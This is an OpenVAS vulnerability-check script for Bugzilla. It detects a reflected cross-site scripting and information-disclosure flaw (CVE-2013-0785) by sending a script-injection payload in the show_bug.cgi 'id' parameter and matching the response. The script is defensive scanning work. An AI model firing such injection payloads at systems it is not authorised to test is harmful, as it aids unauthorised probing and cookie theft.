###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_bugzilla_info_disc_n_xss_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Bugzilla Information Disclosure and Cross-Site Scripting Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to gain sensitive
  information and execute arbitrary HTML and script code in a users
  browser session in context of an affected site.
  Impact Level: Application";

tag_affected = "Bugzilla version 2.0 to 3.6.12, 3.7.1 to 4.0.9, 4.1.1 to 4.2.4
  and 4.3.1 to 4.4rc1";
tag_insight = "- Input passed to the 'id' parameter in show_bug.cgi (when 'format' is set
    to an invalid format) is not properly sanitized before being returned to
    the user.
  - An error related to running a query in debug mode can be exploited to
    disclose if certain field values exists.";
tag_solution = "Upgrade to Bugzilla 3.6.13, 4.0.10, 4.2.5, 4.4rc2 or later,
  For updates refer to http://www.bugzilla.org/download/";
tag_summary = "The host is running Bugzilla and is prone to information disclosure and
  cross site scripting vulnerabilities.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.803173";
CPE = "cpe:/a:mozilla:bugzilla:";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 11 $");
  script_cve_id("CVE-2013-0785", "CVE-2013-0785");
  script_bugtraq_id(58060, 58001);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-03-01 10:58:42 +0530 (Fri, 01 Mar 2013)");
  script_name("Bugzilla Information Disclosure and Cross-Site Scripting Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.osvdb.org/90404");
  script_xref(name : "URL" , value : "http://www.osvdb.org/90397");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/52254");
  script_xref(name : "URL" , value : "http://www.bugzilla.org/security/3.6.12");
  script_xref(name : "URL" , value : "https://bugzilla.mozilla.org/show_bug.cgi?id=842038");
  script_xref(name : "URL" , value : "https://bugzilla.mozilla.org/show_bug.cgi?id=824399");

  script_description(desc);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_summary("Check for cross site scripting vulnerability in Bugzilla");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_dependencies("bugzilla_detect.nasl");
  script_mandatory_keys("bugzilla/installed");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_keepalive.inc");
include("host_details.inc");

## Variables Initialization
dir = "";
bugPort = 0;

## Get HTTP Port
if(!bugPort = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  bugPort = 80;
}

## Check port state
if(!get_port_state(bugPort)){
  exit(0);
}

## Get Bugzilla Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:bugPort)){
  exit(0);
}

url = dir + '/show_bug.cgi?id="><script>alert(document.cookie)</script>&format=123';

## Confirm the Attack
if(http_vuln_check(port:bugPort, url:url,
   pattern:"><script>alert/(document.cookie/)</script>",
   extra_check:"BUGZILLA"))
{
  security_warning(bugPort);
  exit(0);
}
